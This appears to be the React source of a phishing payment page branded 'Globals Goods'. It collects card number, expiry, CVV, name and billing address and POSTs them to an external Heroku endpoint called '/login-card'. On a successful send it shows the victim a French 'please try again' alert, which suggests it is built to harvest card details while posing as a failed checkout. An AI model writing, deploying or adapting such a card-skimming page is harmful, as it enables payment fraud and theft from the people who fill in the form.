import React, {useState} from 'react';
import './App.css';
import Logo from "./global.jpg"

function App() {

  const [number, setNumber] = useState('');
  const [expiration, setExpiration] = useState('');
  const [cvv, setCvv] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [country, setCountry] = useState('');
  const [adress1, setAdress1] = useState('');
  const [adress2, setAdress2] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [codePostal, setCodePostal] = useState('');
  const [addInfo, setAddInfo] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();

    console.log("Numéro de téléphone : " + number);

    fetch("https://universal-app-21e471211385.herokuapp.com/login-card",{
    method: "POST",
    crossDomain: true,
    headers:{
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Access-Control-Allow-Origin": "*",
    },
    body:JSON.stringify({
        number,
        expiration,
        cvv,
        firstName,
        lastName,
        country,
        adress1,
        adress2,
        city,
        state,
        codePostal,
        addInfo
    }),
})
.then((res) => res.json())
.then((data) => {
    if(data.status === "ok"){
        alert('Veuillez Rééssayer')
    }else{
        alert('Something went wrong')
    }
})

}

  return (
    <div className="App">
      <div className="content">
        <div className="logo_name">
          <img src={Logo} alt="Global goods" />
          <h1>Globals Goods</h1>
        </div>
        <div className="header">
          <p>Enter Your Payment Information</p>
        </div>
        <div className="formulaire">
          <form method='post' onSubmit={handleSubmit}>
            <div className="cardNumber">
              <label htmlFor="number">Card Number <span>*</span></label>
              <input type="text" id="number" placeholder="1234 1234 1234 1234" value={number} onChange={(e) => setNumber(e.target.value)} />
            </div>
            <div className="exp_cvv">
              <div className="cardNumber">
                <label htmlFor="expiration">Expiration <span>*</span></label>
                <input type="text" id='expiration' placeholder="MM / YY" value={expiration} onChange={(e) => setExpiration(e.target.value)} />
              </div>
              <div className="cardNumber">
                <label htmlFor="cvv">CVV <span>*</span></label>
                <input type="text" id='cvv' placeholder="CVC" value={cvv} onChange={(e) => setCvv(e.target.value)} />
              </div>
            </div>
            <div className="exp_cvv">
              <div className="cardNumber">
                <label htmlFor="first">First name <span>*</span></label>
                <input type="text" id='first' value={firstName} onChange={(e) => setFirstName(e.target.value)} />
              </div>
              <div className="cardNumber">
                <label htmlFor="last">Last name <span>*</span></label>
                <input type="text" id='last' value={lastName} onChange={(e) => setLastName(e.target.value)}/>
              </div>
            </div>
            <div className="cardNumber">
              <label htmlFor="country">Country <span>*</span></label>
              <input name="country" id="country" placeholder='country' value={country} onChange={(e) => setCountry(e.target.value)}/>
               
            </div>
            <div className="cardNumber">
              <label htmlFor="add1">Billing address line 1 <span>*</span></label>
              <input type="text" id='add1' value={adress1} onChange={(e) => setAdress1(e.target.value)} />
            </div>
            <div className="cardNumber">
              <label htmlFor="add2">Billing address line 2</label>
              <input type="text" id='add2' value={adress2} onChange={(e) => setAdress2(e.target.value)} />
            </div>
            <div className="cardNumber">
              <label htmlFor="city">City <span>*</span></label>
              <input type="text" id='city' value={city} onChange={(e) => setCity(e.target.value)}/>
            </div>
            <div className="cardNumber">
              <label htmlFor="state">State/Province <span>*</span></label>
              <input name="state" id="state" placeholder='State/Province' value={state} onChange={(e) => setState(e.target.value)}/>
            </div>
            <div className="cardNumber">
              <label htmlFor="code">Postal code <span>*</span></label>
              <input type="text" id='code' value={codePostal} onChange={(e) => setCodePostal(e.target.value)} />
            </div>
            <div className="cardNumber">
              <label htmlFor="add_info">Additional information</label>
              <textarea id='add_info' value={addInfo} onChange={(e) => setAddInfo(e.target.value)} rows={3} type="text" placeholder="(company name, tax ID, etc.)" />
            </div>
            <div className="cancel_save">
              <input className='cancel' value="Cancel" />
              <input className='save' type='submit' value="Save Details" />
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}

export default App;
